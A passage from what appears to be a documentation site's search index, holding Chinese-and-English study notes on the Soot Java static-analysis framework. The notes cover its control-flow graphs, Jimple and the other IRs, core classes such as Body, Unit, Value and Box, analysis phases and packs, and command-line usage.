<code>DirectedGraph&lt;N&gt;</code>\uff0c\u8be5\u63a5\u53e3\u5b9a\u4e49\u4e86\u82e5\u5e72\u4e2a getter \u65b9\u6cd5\uff1a</p> <ul> <li>the entry and exit points to the graph,</li> <li>the successors and predecessors of a given node,</li> <li>an iterator to iterate over the graph in some undefined orde and the graphs size (number of nodes).</li> </ul> <p>\u6b64\u5904\u8ba8\u8bba\u7684 CFG \u7684 node \u662f Soot Units\uff0c\u5728 Jimple \u4e2d\uff0cUnits \u7684\u5b9e\u73b0\u662f Stmt\u3002\u6b64\u5916\uff0c\u4ec5\u8ba8\u8bba intra-procedural flow</p> <p>Abstract class\uff1a<code>UnitGraph</code>\uff0c\u63d0\u4f9b\u4e86\u6784\u5efa CFG \u7684\u5de5\u5177\uff0c\u6b64\u5916\uff0csoot \u8fd8\u63d0\u4f9b\u4e86\u4e09\u79cd\u5177\u4f53\u5b9e\u73b0\uff1aBriefUnitGraph, ExceptionalUnitGraph and TrapUnitGraph.</p> <ul> <li>BriefUnitGraph\uff1a\u6700\u7b80\u5355\u7684\u5b9e\u73b0\uff0cit doesn\u2019t have edges representing control flow due to exceptions being thrown</li> <li>ExceptionalUnitGraph\uff1a\u6700\u5e38\u7528\u7684\u5b9e\u73b0\uff0cit includes edges from throw clauses to their handler(catch block, referred to in Soot as Trap), that is if the trap is local to the method body.</li> <li>TrapUnitGraph\uff1a\u7c7b\u4f3c ExceptionalUnitGraph\uff0c\u4f46\u4f1a\u8003\u8651\u53ef\u80fd\u5f15\u53d1\u7684\u5f02\u5e38\u3002</li> </ul> <p>\u5728 soot \u4e2d\uff0c\u53ef\u4ee5\u4e3a body \u751f\u6210 CFG\uff0c\u4f8b\u5982\uff1a</p> <pre><code>UnitGraph g = new ExceptionalUnitGraph(body);\n</code></pre>"},{"location":"security/soot/data-flow-framework/#wrapping-the-results-of-the-analysis","title":"Wrapping the results of the analysis","text":"<p>todo</p>"},{"location":"security/soot/ir/","title":"IR","text":"<p>soot \u5305\u542b\u56db\u79cd IR \u5f62\u5f0f\uff1a</p> <ul> <li>Baf\uff1a\u57fa\u4e8e\u6808\u7684 bytecode</li> <li>Jimple\uff1asoot \u7684\u6838\u5fc3\uff0c\u4e09\u5730\u5740\u7801\u3002Jimple \u9002\u7528\u4e8e\u7edd\u5927\u591a\u6570\u7684\u4e0d\u9700\u8981\u7cbe\u786e control flow \u6216\u8005 SSA \u7684\u9759\u6001\u5206\u6790\u3002</li> <li>Simple\uff1aStatic Single Assignment \u7248\u7684 Jimple\uff0c\u4fdd\u8bc1\u4e86\u6bcf\u4e2a\u5c40\u90e8\u53d8\u91cf\u90fd\u6709\u4e00\u4e2a\u9759\u6001\u5b9a\u4e49\uff0c\u4e0d\u77e5\u9053\u6709\u5565\u7528\u3002</li> <li>Grimp\uff1a\u548c Jimple \u7c7b\u4f3c\uff0c\u591a\u4e86\u5141\u8bb8\u6811\u5f62\u8868\u8fbe\u548c new \u6307\u4ee4\u3002\u76f8\u6bd4\u4e8e Jimple\uff0c\u66f4\u8d34\u8fd1 Java code\uff0c\u6240\u4ee5\u66f4\u9002\u5408\u4eba\u6765\u8bfb\u3002</li> </ul> <pre><code>public static void main(String[] args) {\n</code></pre>"},{"location":"security/soot/ir/#jimple","title":"Jimple","text":"<p>Soot \u80fd\u76f4\u63a5\u521b\u5efa Jimple \u7801\uff0c\u4e5f\u53ef\u7531 Java source code\u3001bytecode or class files \u521b\u5efa\u3002</p> <p>\u76f8\u5bf9\u4e8e bytecode \u7684 200 \u591a\u79cd\u6307\u4ee4\uff0cJimple \u53ea\u6709 15 \u6761\uff0c\u5206\u522b\u662f\uff1a</p> <ul> <li>\u6838\u5fc3\u6307\u4ee4\uff1aNopStmt\u3001IdentityStmt\u3001AssignStmt</li> <li>\u51fd\u6570\u5185\u63a7\u5236\u6d41\u6307\u4ee4\uff1aIfStmt\u3001GotoStmt\\TableSwitchStmt\u3001LookUpSwitchStmt</li> <li>\u51fd\u6570\u95f4\u63a7\u5236\u6d41\uff1aInvoeStmt\u3001ReturnStmt\u3001ReturnVoidStmt</li> <li>\u76d1\u89c6\u5668\u6307\u4ee4\uff1aEnterMonitorStmt\u3001ExitMonitorStmt</li> <li>\u5904\u7406\u5f02\u5e38\uff1aThrowStmt</li> <li>\u9000\u51fa\uff1aRetStmt</li> </ul> <p>\u8981\u5bf9 Jimple \u64cd\u4f5c\uff0c\u9996\u5148\u9700\u8981\u5b9e\u4f8b\u5316\u4e00\u4e2a Jimple \u7684\u73af\u5883\u5bf9\u8c61 scene :</p> <pre><code>val scence = Scene.v()\n</code></pre> <p>\u7136\u540e\uff0c\u518d\u5bf9 scene \u8fdb\u884c\u5206\u6790\u548c\u64cd\u4f5c</p> <pre><code>package com.wang;\n\npublic class Foo {\n    public static void main(String[] args) {\n        Foo f = new Foo();\n        int a = 7;\n        int b = 14;\n        int x = (f.bar(21) + a) * b ;\n        System.out.println(x);\n    }\n    public int bar(int n) { return n + 42; }\n}\n</code></pre> <p>\u4e0a\u8ff0 Java \u4ee3\u7801\u8f6c\u5316\u4e3a Jimple \u540e\u5982\u4e0b\uff1a</p> <pre><code>public class com.wang.Foo extends java.lang.Object\n{\n\n    public void &lt;init&gt;()\n    {\n        com.wang.Foo r0;\n\n        r0 := @this: com.wang.Foo;\n\n        specialinvoke r0.&lt;java.lang.Object: void &lt;init&gt;()&gt;();\n\n        return;\n    }\n\n    public static void main(java.lang.String[])\n    {\n        java.io.PrintStream $r1;\n        com.wang.Foo $r0;\n        int $i0, $i1, i2;\n        java.lang.String[] r2;\n        r2 := @parameter0: java.lang.String[];\n        $r0 = new com.wang.Foo;\n        // InvokeStmt, specialinvode \u8c03\u7528\u6784\u9020\u51fd\u6570. virtualinvode \u5927\u591a\u6570\u8c03\u7528\u90fd\u662f\u8fd9\u4e2a\u3002\n        specialinvoke $r0.&lt;com.wang.Foo: void &lt;init&gt;()&gt;();\n        $i0 = virtualinvoke $r0.&lt;com.wang.Foo: int bar(int)&gt;(21);     // \u4e5f\u662f AssignStmt\n        $i1 = $i0 + 7;\n        i2 = $i1 * 14;\n        $r1 = &lt;java.lang.System: java.io.PrintStream out&gt;;\n        virtualinvoke $r1.&lt;java.io.PrintStream: void println(int)&gt;(i2);\n        return;\n    }\n\n    public int bar(int)\n    {\n        int i0, $i1;\n        com.wang.Foo r0;\n        r0 := @this: com.wang.Foo;   // IdentityStmt\n        i0 := @parameter0: int;      // IdentityStmt\n        $i1 = i0 + 42;               // AssignStmt\n        return $i1;                  // ReturnStmt\n    }\n}\n</code></pre> <p>\u5728 Soot \u4e2d\uff0c\u65e2\u6709\u4e0e Java \u5bf9\u5e94\u7684\u6982\u5ff5\uff1a</p> <ul> <li>\u7c7b Class</li> <li>\u5b57\u6bb5 Filed</li> <li>\u65b9\u6cd5 Method</li> </ul> <p>\u8fd8\u6709 Soot \u81ea\u5b9a\u4e49\u7684\u6982\u5ff5\uff1a</p> <ul> <li>Unit\uff1a\u5728 Jimple \u4e2d\u7684\u5b9e\u73b0\u662f stmt\uff0c\u5728 Grimp \u4e2d\u7684\u5b9e\u73b0\u662f Inst</li> <li>Box</li> <li>Value</li> <li>CallGraph</li> <li>...</li> </ul>"},{"location":"security/soot/ir/#scene","title":"Scene","text":"<p>scene \u4e2d\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6 Java Source \u4e2d\u7684\u6240\u6709 Class\uff0c\u6bcf\u4e00\u4e2a Class \u90fd\u4f1a\u751f\u6210\u4e00\u4e2a Jimple \u6587\u4ef6\u4e0e\u4e4b\u5bf9\u5e94\u3002\u5982\u679c\u662f\u5185\u90e8\u7c7b\uff0c\u540d\u79f0\u524d\u52a0\u5176\u6240\u5728\u7c7b\u7684\u540d\u79f0\u5e76\u7528<code>$</code>\u7b26\u53f7\u8fde\u63a5\u3002</p> <p>Tip</p> <p>\u4f7f\u7528 javac \u7f16\u8bd1\u4e00\u4e2a\u540d\u4e3a<code>outClass</code>\u7684\u7c7b\uff0c\u5176\u5185\u90e8\u5b58\u5728\u4e00\u4e2a\u5185\u90e8\u7c7b<code>inClass</code>\uff0c\u4f7f\u7528<code>javac outclass</code>\u540e\uff0c\u4f1a\u751f\u6210\u4e24\u4e2a\u6587\u4ef6\uff1a</p> <ul> <li>outClass.class</li> <li>outClass$inclass.class</li> </ul> <p>\u6545\u800c\uff0cscene \u672c\u8d28\u4e0a\u5e94\u8be5\u5c31\u662f\u505a\u4e86\u7f16\u8bd1\u5de5\u4f5c\uff1f\u6b64\u5904\u5b58\u7591\uff01</p> <p>\u901a\u8fc7 Scene\uff0c\u5728\u5f00\u542f\u4e86<code>whole program mode</code>\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd8\u53ef\u4ee5\u7528\u4e8e\u751f\u6210 <code>Call Graph</code>\u3002</p>"},{"location":"security/soot/ir/#class","title":"Class","text":"<p>class \u4ee3\u8868\u4e00\u4e2a Java Class \u7c7b\uff0c\u76f8\u5e94\u7684\u901a\u8fc7 Jimple \u53ef\u4ee5\u83b7\u53d6 class \u4e2d\u5305\u542b\u7684\uff1a</p> <ul> <li>\u5b57\u6bb5 Field</li> <li>\u65b9\u6cd5 Method</li> <li>class \u7684\u7236\u7c7b\u65b9\u6cd5 superClass</li> <li>\u7ee7\u627f\u7684\u63a5\u53e3 Interface \u7b49\u3002</li> </ul> <p>\u6839\u636e Java \u7684\u5b9a\u4e49\uff0c\u6bcf\u4e00\u4e2a\u7c7b\u4f1a\u5305\u542b\u6709\u6784\u9020\u5668\uff0c\u56e0\u6b64 class \u7684 methods \u4e2d\u4e00\u5b9a\u4f1a\u6709\u4e00\u4e2a\u6784\u9020\u65b9\u6cd5\uff0c\u65b9\u6cd5\u540d\u4e3a<code>&lt;init&gt;</code>\uff0c\u53c2\u6570\u4e0e\u6784\u9020\u65b9\u6cd5\u7684\u53c2\u6570\u76f8\u540c\u3002</p> <p>\u540c\u65f6\uff0c\u5728\u4e3b\u7c7b mainClass\uff0c\u5373\u5305\u542b\u6709 main \u5165\u53e3\u65b9\u6cd5\u7684\u7c7b\u4e2d\uff0c\u5982\u679c\u5b9a\u4e49\u6709\u5168\u5c40\u53d8\u91cf\uff0c\u867d\u7136\u8fd9\u4e5f\u5c5e\u4e8e Field\uff0c\u4f46\u662f\u8fd9\u4e9b\u53d8\u91cf\u7684\u521d\u59cb\u5316\u64cd\u4f5c\u5728\u4e00\u4e2a\u65b0\u7684\u65b9\u6cd5\u4e2d\u6267\u884c\uff0c\u65b9\u6cd5\u540d\u4e3a<code>&lt;clinit&gt;</code>\u3002</p> <pre><code>public class com.wang.Foo extends java.lang.Object\n</code></pre>"},{"location":"security/soot/ir/#field","title":"Field","text":"<p>Class \u4e2d\u7684\u5b57\u6bb5\u5373 Field\uff0c\u5b57\u6bb5\u88ab\u5f15\u7528\u6216\u8005\u8d4b\u503c\u65f6\uff0c\u662f\u901a\u8fc7 FieldRef \u5b9e\u73b0\u7684\u3002FieldRef \u4e2d\u5305\u542b\u4e86 declaringClass\uff0cname \u7b49\u57fa\u672c\u4fe1\u606f\u3002</p> <p>\u5728 class \u4e2d\u901a\u8fc7<code>getFieldByName(String name)</code>\u83b7\u53d6\u5b57\u6bb5\u65f6\uff0c\u5982\u679c\u6ca1\u6709\u8be5\u540d\u5b57\u7684\u5b57\u6bb5\uff0cJimple \u4f1a\u81ea\u52a8\u751f\u6210\u4e00\u4e2a\u3002</p> <pre><code>java.lang.String[] r2;\n</code></pre>"},{"location":"security/soot/ir/#method","title":"Method","text":"<p>\u65b9\u6cd5 Method \u7684\u7ec4\u6210\u6709\u53c2\u6570 ParameterList\uff0c\u8fd4\u56de\u7c7b\u578b ReturnType\uff0c\u65b9\u6cd5\u4f53 Body\u3002</p> <p>Method \u7684 Body \u662f\u5206\u6790\u548c\u4fee\u6539 Method \u7684\u57fa\u7840\uff0c\u5305\u542b\u4e86 Method \u4e2d\u6240\u6709\u7684\u8bed\u53e5\u5355\u5143 Unit\u3002</p> <p>Method \u4e5f\u53ef\u4ee5\u88ab\u8c03\u7528\uff0c\u8c03\u7528\u7684\u65b9\u6cd5\u4e3a MethodRef\u3002</p> <p>\u540c\u6837\uff0c\u5728\u901a\u8fc7<code>getMethodByName(String name)</code>\u65f6\uff0c\u5982\u679c\u540d\u5b57\u3001\u53c2\u6570\u3001\u8fd4\u56de\u7c7b\u578b\u6709\u4e00\u4e2a\u4e0d\u540c\uff0cJimple \u4f1a\u81ea\u52a8\u751f\u6210\u4e00\u4e2a\uff0c\u5e76\u4e14\u8be5\u65b9\u6cd5\u4f53\u4e2d\u6709 Error\u3002</p> <pre><code>com.wang.Foo: int bar(int)\n</code></pre>"},{"location":"security/soot/ir/#body-unit","title":"Body -&gt; Unit","text":"<p>Body \u4ee3\u8868\u4e86\u4e00\u4e2a Method \u7684\u65b9\u6cd5\u4f53\uff0c\u6bcf\u4e2a Body \u91cc\u9762\u6709\u4e09\u4e2a\u4e3b\u94fe\uff0c\u5206\u522b\u662f Units \u94fe\u3001Locals \u94fe\u3001Traps \u94fe\uff1a</p> <ul> <li>Units\uff1a\u65b9\u6cd5\u7684\u8bed\u53e5\uff0c\u5728 Jimple \u4e2d\uff0cUnit \u7684\u5b9e\u73b0\u5c31\u662f Stmt\uff1b\u800c Grimp \u4e2d\uff0cUnit \u7684\u5b9e\u73b0\u662f Inst\u3002</li> <li>Locals\uff1a\u65b9\u6cd5\u7684\u5c40\u90e8\u53d8\u91cf</li> <li>Traps\uff1a\u65b9\u6cd5\u7684\u5f02\u5e38\u5904\u7406</li> </ul> <p>soot \u4e2d\u5171\u6709\u56db\u79cd Body\uff1a<code>BafBody</code>, <code>JimpleBody</code>,<code>ShimpleBody</code> and <code>GrimpBody</code>\uff0c\u5728\u5177\u4f53\u5b9e\u73b0\u4e2d\uff0c\u90fd\u7ee7\u627f\u4e86\u62bd\u8c61\u7c7b Body\u3002</p> <p>\u6267\u884c\u8bed\u53e5 Unit \u7684\u7c7b\u578b Stmt \u5e38\u89c1\u7684\u6709:</p> <pre><code>r0 := @this: com.wang.Foo;                            // IdentityStmt ThisRef\ni0 := @parameter0: int;                             // IdentityStmt ParameterRef\n$i1 = i0 + 42;                                      // AssignStmt\nreturn $i1;                                         // ReturnStmt\nspecialinvoke $r0.&lt;com.wang.Foo: void &lt;init&gt;()&gt;();    // invokeStmt\n</code></pre>"},{"location":"security/soot/ir/#value","title":"Value","text":"<p>Value \u7528\u4e8e\u8868\u793a\u6570\u636e\uff0cValue \u5171\u6709\u5982\u4e0b\u51e0\u7c7b\uff1a</p> <ul> <li><code>Local</code></li> <li><code>Constant</code></li> <li><code>Expr</code></li> <li><code>Ref</code>\uff0c\u5982<code>ParameterRef</code>, <code>CaughtExceptionRef</code> and <code>ThisRef</code></li> </ul> <p>\u5176\u4e2d Expr \u662f\u6700\u6709\u8da3\u7684\uff0c\u5b83\u53ef\u4ee5\u7ec6\u5206\u4e3a\u591a\u79cd\u5b9e\u73b0\uff0c\u4f8b\u5982\uff1a<code>NewExpr</code>\u548c<code>AddExpr</code>\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u4e00\u4e2a Expr \u53ef\u4ee5\u5bf9\u82e5\u5e72\u4e2a Value \u8fdb\u884c\u4e00\u4e9b\u64cd\u4f5c\u5e76\u4e14\u8fd4\u56de\u53e6\u4e00\u4e2a Value\u3002</p> <pre><code>y = x + 1;    // AssignStmt\n</code></pre> <p>\u4ee5\u4e0a\u8ff0\u7684 AssignStmt \u4e3a\u4f8b\uff0c\u5176 leftOp \u662f <code>y</code>\uff0crightOp \u662f<code>x + 1</code>\uff0c\u6b64\u65f6<code>AddExpr</code>\u5c06\u5176\u4f5c\u4e3a\u64cd\u4f5c\u6570\uff0c\u8fd4\u56de\u65b0\u7684 Value\u3002\u5176\u4e2d <code>y</code> \u662f <code>Local</code> \u7c7b\u578b\u7684 Value\uff0c\u800c <code>1</code>\u662f <code>Constant</code>\u7c7b\u578b\u7684 Value\u3002</p>"},{"location":"security/soot/ir/#box","title":"box","text":"<p>box \u662f\u4e00\u4e2a\u6307\u9488\uff0c\u5728 soot \u4e2d\u6709\u4e24\u7c7b box\uff1a</p> <ul> <li>UnitBox</li> <li>ValueBox</li> </ul>"},{"location":"security/soot/ir/#unitbox","title":"UnitBox","text":"<p>\u6bcf\u4e2a Unit \u90fd\u4f1a\u63d0\u4f9b getUnitBoxes() \u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u8fd4\u56de\u7a7a\u96c6\uff0c\u4f46\u4ee3\u7801\u4e2d\u5b58\u5728\uff1a</p> <ul> <li>GotoStmt\uff1a\u8fd4\u56de\u5355\u4e2a\u5143\u7d20\u7684\u5217\u8868\uff0c\u5982\u4e0b\u793a\u4f8b</li> <li>SwitchStmt\uff1a\u8fd4\u56de\u591a\u4e2a\u5143\u7d20\u7684\u5217\u8868</li> </ul> <pre><code>    x = 5;\n    goto l2;\n    y = 3;\nl2: z = 9;\n</code></pre> <p>\u6b64\u65f6\u5bf9 <code>goto l2</code>\u8fd9\u4e2a Unit \u8c03\u7528\u65b9\u6cd5 <code>Unit.getUnitBoxes()</code>\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a UnitBox\uff0c\u6307\u5411 l2\u3002</p>"},{"location":"security/soot/ir/#valuebox","title":"ValueBox","text":"<p>\u4e0e UnitBox \u7c7b\u4f3c\uff0c\u662f\u6307\u5411 Value \u7684\u6307\u9488\u3002</p> <ol> <li>\u5bf9\u4e8e\u8fd9\u4e2a AssignStmt \u6765\u8bf4\uff0c\u9700\u8981\u9996\u5148\u83b7\u53d6\u4ed6\u7684 Boxes\uff0c\u8fd9\u4e9b Boxes \u91cc\u9762\u5305\u542b\u4e86 Value \u7684\u6307\u9488\u3002</li> <li>\u904d\u5386 Boxes\uff0ccast \u4e3a ValueBox\uff0c\u7136\u540e\u83b7\u53d6\u4ed6\u7684 Value\uff0c\u5982\u679c\u662f AddExpr \u7684\u8bdd\uff0c\u90a3\u5c31\u662f\u6211\u4eec\u60f3\u4f18\u5316\u7684\u3002</li> <li>\u5bf9\u4e8e AddExpr \u6765\u8bf4\uff0c\u83b7\u53d6\u4ed6\u7684\u5de6\u503c\u548c\u53f3\u503c\uff0c\u4e5f\u5c31\u662f\u4e24\u4e2a value\u3002</li> <li>\u5982\u679c\u90fd\u662f\u5e38\u91cf IntConstant \u7684\u8bdd\uff0c\u90a3\u4e48\u5c31\u628a\u4ed6\u4eec\u7684 value \u52a0\u5728\u4e00\u8d77\u3002</li> <li>\u91cd\u65b0\u7ed9 AssignStmt \u7684 box \u8d4b\u503c\uff0c\u8ba9\u4ed6\u6307\u5411 sum \u548c\u7684\u5e38\u91cf\u3002</li> </ol> <pre><code>public void foldAdds(Unit u)\n{\n    Iterator ubIt = u.getUseBoxes().iterator();\n    while (ubIt.hasNext())\n    {\n        ValueBox vb = (ValueBox) ubIt.next();\n        Value v = vb.getValue();\n        if (v instanceof AddExpr)\n        {\n            AddExpr ae = (AddExpr) v;\n            Value lo = ae.getOp1(), ro = ae.getOp2();\n            if (lo instanceof IntConstant &amp;&amp; ro instanceof IntConstant)\n            {\n                IntConstant l = (IntConstant) lo,\n                      r = (IntConstant) ro;\n                int sum = l.value + r.value;\n                vb.setValue(IntConstant.v(sum));\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"security/soot/ir/#phases","title":"Phases","text":"<p>soot \u7684\u6267\u884c\u5206\u4e3a\u82e5\u5e72\u4e2a<code>phase</code>\uff0c\u6bcf\u4e2a<code>phase</code>\u7684\u5b9e\u73b0\u79f0\u4e3a<code>pack</code>\u3002\u6b64\u5916\uff0c\u6bcf\u4e2a<code>phase</code>\u53c8\u88ab\u7ec6\u5206\u4e3a\u82e5\u5e72\u4e2a<code>subphase</code>\u3002</p> <p>Tip</p> <p>\u53ef\u4ee5\u628a soot \u7406\u89e3\u4e3a maven\uff0c\u5b83\u4eec\u7684\u6267\u884c\u90fd\u5206\u4e3a\u82e5\u5e72\u6b65\u9aa4\uff0c\u4e14\u53ef\u4ee5\u901a\u8fc7\u53c2\u6570\u9009\u62e9\u5f00\u542f\u6216\u5173\u95ed\u7279\u5b9a\u7684\u6b65\u9aa4\uff01</p> <p>\u6267\u884c\u7684\u7b2c\u4e00\u4e2a<code>phase</code>\uff0c\u540d\u4e3a<code>jb</code>\uff0c\u8be5\u9636\u6bb5\u89e3\u6790 Class\u3001Jimple\u3001Source \u6587\u4ef6\uff0c\u5c06\u89e3\u6790\u7ed3\u679c <code>Jimple Body</code>\uff0c\u8f93\u5165\u4e0d\u540c\u6b64\u540e\u7684\u7684 <code>phase</code>\u4e2d\u3002</p> <p>\u6b64\u5916\uff0c<code>jb</code>\u7ec6\u5206\u4e3a<code>jb.a</code>\u7b49\u82e5\u5e72\u4e2a<code>subphase</code>\u3002</p> <p>Tip</p> <p>Body \u662f\u65b9\u6cd5\u4f53\uff0c\u7a0b\u5e8f\u5185\u5206\u6790\uff08intra-procedure analysis\uff09\uff0c\u5176\u5b9e\u5c31\u662f\u5206\u6790\u5355\u4e2a\u65b9\u6cd5\u5185\u90e8\u7684\u4ee3\u7801\uff0c\u5982\u679c\u8be5\u65b9\u6cd5\u5185\u90e8\u8c03\u7528\u4e86\u5176\u5b83\u65b9\u6cd5\uff0c\u4e0d\u4f1a\u8fdb\u884c\u6df1\u5165\u7684\u5206\u6790\u3002\u800c\u7a0b\u5e8f\u95f4\u5206\u6790\uff08inter-procedure analysis\uff09\u5219\u662f\u5728\u524d\u8005\u7684\u57fa\u7840\u4e0a\uff0c\u5bf9\u65b9\u6cd5\u8c03\u7528\u8fdb\u884c\u66f4\u4e3a\u6df1\u5165\u7684\u5206\u6790\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5b58\u5728\u540d\u4e3a<code>jtp</code>\u7684\u82e5\u5e72\u79cd<code>pack</code>\uff0c\u5176\u547d\u540d\u89c4\u5219\u4e3a\uff1a</p> <ul> <li>\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u8868\u793a\u63a5\u53d7\u54ea\u79cd\u5f62\u5f0f\u7684 IR \u4f5c\u4e3a\u8f93\u5165\uff1a s for Shimple, j for Jimple, b for Baf and g for Grimp.</li> <li>\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\uff0c\u8868\u793a<code>pack</code>\u7684\u89d2\u8272\uff1ab for body creation, t for user-defined transformations, o for optimizations and a for attribute generation (annotation).</li> <li>\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd <code>p</code>\uff0c\u4ee3\u8868\u7740 <code>pack</code>\uff1a\u4f8b\u5982 <code>jap</code>\u7684\u542b\u4e49\u662f <code>Jimple Annotation Pack</code>\uff0c\u5305\u542b\u4e86\u6240\u6709\u5728 <code>intra-procedural analysis</code>\u4e2d\u6784\u5efa\u7684\u5185\u5bb9\u3002</li> </ul> <p>\u503c\u5f97\u7279\u522b\u5173\u6ce8\u7684\u662f\uff1a</p> <ul> <li>jtp(Jimple transformation pack)\u548c stp(Shimple transformation pack)\u3002\u56e0\u4e3a\u4efb\u4f55\u7528\u6237\u5b9a\u4e49\u7684 <code>BodyTransfer</code>(\u5982\u4ece\u5206\u6790\u4e2d\u5f97\u51fa\u5bf9\u4fe1\u606f\u7684\u6807\u7b7e) \u53ef\u4ee5\u88ab\u63d2\u5165(inject)\u5230\u8fd9\u4e24\u4e2a <code>pack</code> \u4e2d\uff0c\u4f5c\u4e3a Soot \u6267\u884c\u8fc7\u7a0b\u7684\u4e00\u90e8\u5206\u3002</li> <li>jap(Jimple annotation pack)\uff1a\u5b58\u653e\u4f18\u5316\u7684\u7ed3\u679c\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528<code>BodyTransfer</code>\uff0c\u4f5c\u4e3a Soot \u6267\u884c\u8fc7\u7a0b\u7684\u4e00\u90e8\u5206\u3002</li> <li>jop\uff0c\u9ed8\u8ba4\u5173\u95ed\uff0c\u4f7f\u7528<code>-o</code>\u5f00\u542f\u3002</li> </ul> <p></p> <p>\u4e0a\u8ff0\u53ca\u4e0a\u56fe\u8868\u793a\u7684\u662f intra-procedural analysis \u7684\u6267\u884c\u6d41\u7a0b\uff0c\u4f46 inter-procedure analysis \u7565\u6709\u4e0d\u540c\u3002</p> <p>\u9996\u5148\uff0c\u9700\u8981\u5c06 soot \u7f6e\u4e8e <code>Whole-program</code>\u6a21\u5f0f\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e option \u4e3a <code>-w</code>\u6765\u5b9e\u73b0\u3002</p> <p>\u5728\u8be5\u6a21\u5f0f\u4e0b\uff0csoot \u9996\u5148\u4e3a\u6240\u6709\u7684\u65b9\u6cd5\u6267\u884c Jimple Body\uff08jd\uff09\uff0c\u7136\u540e\u6267\u884c\u65b0\u589e\u7684\u56db\u79cd\u5168\u7a0b\u5e8f <code>pack</code>\uff1a</p> <ul> <li>cg\uff1acall graph generation</li> <li>wjtp\uff1awhole Jimple transformation pack</li> <li>wjop, the whole-jimple optimization pack (\u901a\u8fc7 <code>-W</code>\u5f00\u542f)</li> <li>wjap\uff1awhole Jimple annotation pack</li> </ul> <p>\u8fd9\u56db\u79cd<code>pack</code>\u662f\u53ef\u4ee5\u6539\u53d8\u7684\uff0c\u4e3a\u5176\u6dfb\u52a0 <code>SceneTransformers</code>\u8fdb\u884c\u4e00\u4e2a\u5168\u7a0b\u5e8f\u7684\u5206\u6790\u3002</p> <p></p> <p>\u4f7f\u7528\u4e0b\u8ff0\u547d\u4ee4\u83b7\u53d6 soot \u652f\u6301\u7684\u6240\u6709<code>pack</code></p> <pre><code>java -cp $SOOT_HOME soot.Main -pl\n# $PACH_NAME=wjtp\njava -cp $SOOT_HOME soot.Main -ph $PACK_NAME\n</code></pre> <p>\u6240\u6709\u7684 phases and subphases \u90fd\u63a5\u53d7 option <code>enabled</code>\uff0c\u60f3\u8981\u8ba9\u8be5 phase \u8fd0\u884c\uff0c<code>enabled</code>\u5fc5\u987b\u4e3a<code>true</code>\u3002\u4e3a\u4e86\u65b9\u4fbf\u4e66\u5199\uff0c\u53ef\u4ee5\u7528\uff1a</p> <ul> <li>on\uff0c\u4ee3\u66ff enable:true\uff0c\u4f8b\u5982\u60f3\u5f00\u542f Spark\uff0c<code>-p cg.spark on</code></li> <li>off\uff0c\u4ee3\u66ff enable:false</li> </ul>"},{"location":"security/soot/usage/","title":"Usage","text":"<p>First of all, install soot.</p> <p>\u5728 soot \u4e2d\uff0c\u533a\u5206\u4e86\u4e09\u79cd\u7c7b\uff1a</p> <ul> <li>argument classes\uff1a\u7528\u6237\u5728\u547d\u4ee4\u884c\u7684 classname \u4e2d\u663e\u5f0f\u6307\u5b9a\u7684\u7c7b\uff0c\u4e5f\u53ef\u4ee5\u662f -process-dir \u6307\u5b9a\u7684\u76ee\u5f55\u4e2d\u626b\u63cf\u5f97\u5230\u7684\u7c7b\u3002</li> <li>application classes\uff1a\u9700\u8981 soot \u5206\u6790\uff0c\u5e76\u88ab\u8f6c\u6362\u4e3a\u8f93\u51fa\u7684\u7c7b\u3002\u6240\u6709 argument classes \u5fc5\u987b\u5f0f application classes\u3002</li> <li>library classes\uff1aapplication classes \u5f15\u7528\u7684\u7c7b\uff0c\u4f46\u4e0d\u662f application classes\u3002\u5b83\u4eec\u4f1a\u88ab\u7528\u4e8e\u5206\u6790\u548c\u8f6c\u6362\uff0c\u4f46\u81ea\u5df1\u4e0d\u4f1a\u88ab\u8f6c\u6362\u6216\u8f93\u51fa\u3002</li> </ul> <p>\u5b58\u5728\u4e24\u79cd\u6a21\u5f0f\u4f1a\u5f71\u54cd\u7c7b\u7684\u5206\u7c7b\u65b9\u5f0f\uff1a</p> <ul> <li>application mode\uff1a\u8be5\u6a21\u5f0f\u4e0b\uff0cargument \u5f15\u7528\u7684\u7c7b\u5c06\u6210\u4e3a application classes</li> <li>non-application mode\uff1a\u5728\u8be5\u6a21\u5f0f\u4e0b\uff0cargument \u5f15\u7528\u7684\u7c7b\u5c06\u6210\u4e3a library classes</li> </ul> <p>\u4f7f\u7528<code>--app</code>\u5f00\u542f application mode\u3002</p> <pre><code>java [javaOptions] soot.Main --app classname\n</code></pre>"},{"location":"security/soot/usage/#shell","title":"Shell","text":"<p>\u4f7f\u7528\u547d\u4ee4\u884c\u64cd\u4f5c soot\uff0c\u6574\u4f53\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>java [javaOptions] soot.Main [sootOptions] classname\n</code></pre> <ul> <li><code>javaOptions</code>\uff1ajava \u53ef\u4ee5\u63a5\u6536\u7684\u9009\u9879\uff0c\u4f8b\u5982\u901a\u8fc7 <code>-cp $SOOT_HOME</code> \u6765\u6307\u5b9a soot \u7684 jar \u5305\u76ee\u5f55.</li> <li><code>sootOptions</code>\uff1asoot \u53ef\u4ee5\u63a5\u6536\u7684\u9009\u9879\uff0c\u901a\u8fc7 <code>java [javaOptions] soot.Main -h</code> \u83b7\u53d6\u9009\u9879\u5217\u8868</li> <li><code>classname</code>\uff1asoot \u8981\u5206\u6790\u7684\u7c7b</li> </ul>"},{"location":"security/soot/usage/#options","title":"options","text":""},{"location":"security/soot/usage/#general-options","title":"general options","text":"general options desc <code>-h</code> \u663e\u793a\u5e2e\u52a9\u4fe1\u606f <code>-pl</code> \u6253\u5370\u652f\u6301\u7684 phases <code>-ph &lt;phase&gt;</code> \u6253\u5370\u6307\u5b9a phase \u7684\u8be6\u7ec6\u4fe1\u606f <code>-w</code> Run in whole-program mode, \u542f\u7528\u8fc7\u7a0b\u95f4\u5206\u6790, enable wjpp, cg, and 